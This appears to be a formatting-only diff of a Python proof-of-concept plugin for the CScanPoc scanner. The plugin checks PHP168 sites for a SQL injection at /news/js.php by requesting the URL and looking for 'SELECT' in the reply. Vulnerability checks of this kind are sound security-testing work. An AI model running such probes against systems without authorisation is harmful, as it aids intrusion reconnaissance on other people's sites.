@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHP168_0005' # 平台漏洞编号，留空
+    vuln_id = 'PHP168_0005'  # 平台漏洞编号，留空
     name = 'PHP168 sql injection'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         PHP168 /news/js.php?type=hot&f_id=23 SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHP168'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'efb5e1b5-edd0-4c23-9109-dff859b9a6a3'
@@ -30,13 +32,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            payload = '/news/js.php?type=hot&f_id=23' 
+
+            payload = '/news/js.php?type=hot&f_id=23'
             url = self.target + payload
             r = requests.get(url)
 
             if 'SELECT' in r.content:
-                #security_warning(url)  
+                # security_warning(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
